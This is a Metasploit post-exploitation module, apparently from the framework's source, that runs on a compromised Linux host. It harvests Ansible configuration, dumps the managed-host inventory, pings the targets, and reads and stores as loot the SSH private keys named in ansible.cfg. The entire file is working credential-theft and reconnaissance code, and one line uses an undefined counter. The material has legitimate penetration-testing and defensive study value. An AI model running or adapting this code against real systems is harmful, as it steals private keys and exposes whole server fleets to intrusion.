##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Exploit::Local::Ansible

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ansible Config Gather',
        'Description' => %q{
          This module will grab ansible information including hosts, ping status, and the configuration file.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('ANSIBLECFG', [true, 'Ansible config file location', '']),
        OptString.new('HOSTS', [ true, 'Which ansible hosts to target', 'all' ]),
      ], self.class
    )

    register_advanced_options(
      [
        OptString.new('ANSIBLEINVENTORY', [true, 'Ansible-inventory executable location', '']),
      ], self.class
    )
  end

  def ansible_inventory
    return @ansible_inv if @ansible_inv

    ['/usr/local/bin/ansible-inventory', datastore['ANSIBLEINVENTORY']].each do |exec|
      next unless file?(exec)
      next unless executable?(exec)

      @ansible_inv = exec
    end
    @ansible_inv
  end

  def ansible_cfg
    return @ansible_cfg if @ansible_cfg

    [datastore['ANSIBLECFG'], '/etc/ansible/ansible.cfg', '/playbook/ansible.cfg'].each do |f|
      next if f.empty?
      next unless file?(f)

      @ansible_cfg = f
    end
    @ansible_cfg
  end

  def ping_hosts_print
    results = ping_hosts

    columns = ['Host', 'Status', 'Ping', 'Changed']
    table = Rex::Text::Table.new('Header' => 'Ansible Pings', 'Indent' => 1, 'Columns' => columns)

    results.each do |match|
      table << [match['host'], match['status'], match['ping'], match['changed']]
      count + 1 if match['ping'] == 'pong'
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def conf
    unless file?(ansible_cfg)
      print_bad('Unable to find config file')
      return
    end

    ansible_config = read_file(ansible_cfg)
    stored_config = store_loot('ansible.cfg', 'text/plain', session, ansible_config, 'ansible.cfg', 'Ansible config file')
    print_good("Stored config to: #{stored_config}")
    ansible_config.lines.each do |line|
      next unless line.start_with?('private_key_file')

      file = line.split(' = ')[1].strip
      print_good("Private key file location: #{file}")
      next unless file?(file)

      key = read_file(file)
      loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
      print_good("Stored private key file to: #{loot}")
    end
  end

  def hosts_list
    hosts = cmd_exec("#{ansible_inventory} --list")
    hosts = JSON.parse(hosts)
    inventory = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
    print_good("Stored inventory to: #{inventory}")
    columns = ['Host', 'Connection']
    table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
    hosts = hosts.dig('_meta', 'hostvars')
    hosts.each do |host|
      table << [host[0], host[1]['ansible_connection']]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def run
    fail_with(Failure::NotFound, 'Ansible executable not found') if ansible_exe.nil?
    hosts_list
    ping_hosts_print
    conf
  end
end
